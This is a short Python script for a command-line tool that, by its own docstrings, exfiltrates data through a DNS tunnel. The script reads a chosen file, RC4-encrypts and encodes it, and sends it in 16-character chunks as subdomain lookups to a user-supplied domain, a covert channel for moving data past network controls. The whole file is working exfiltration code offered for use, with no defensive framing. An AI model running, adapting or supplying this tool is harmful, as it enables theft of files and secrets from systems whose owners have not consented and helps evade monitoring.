import argparse
import logging
import warnings

import dns.resolver

import encryptor


warnings.filterwarnings("ignore", category=DeprecationWarning)


def get_contents(path: str) -> str:
    """
    Reads the contents of a file and returns them as a string.

    Args:
        path: The path to the file to read.

    Returns:
        The contents of the file as a string.
    """
    try:
        with open(path, "r") as f:
            return f.read()
    except IOError as e:
        logging.error(f"Error reading file {path}: {e}")
        exit(1)


def dns_tunnel(path: str, domain: str, key: str = "") -> None:
    """
    Exfiltrates data from a file using a DNS tunnel.

    Args:
        path: The path to the file to exfiltrate.
        domain: The domain to use for the DNS tunnel.
        key: The key to use for RC4 encryption (optional).
    """
    rc4 = encryptor.Encryptor(key.encode()) if key else encryptor.Encryptor()
    data = get_contents(path)
    data = rc4.encrypt_encode(data.encode())

    data_chunks = [data[i : i + 16] for i in range(0, len(data), 16)]

    for index, chunk in enumerate(data_chunks, start=1):
        packet = f"{index}.{chunk}.{domain}"
        logging.info(f"Sending packet {index} of {len(data_chunks)}: {packet}")
        try:
            dns.resolver.query(packet)
        except (
            dns.resolver.NXDOMAIN,
            dns.resolver.NoAnswer,
            dns.resolver.NoNameservers,
        ) as e:
            logging.exception(
                f"Error sending packet {index} of {len(data_chunks)}: {packet}"
            )
            exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Tunnel")
    parser.add_argument("path", type=str, help="Path to file for exfiltration")
    parser.add_argument("domain", type=str, help="Domain to use for DNS tunnel")
    parser.add_argument("-k", "--key", type=str, help="Key for RC4 encryption")
    args = parser.parse_args()

    dns_tunnel(args.path, args.domain, args.key)
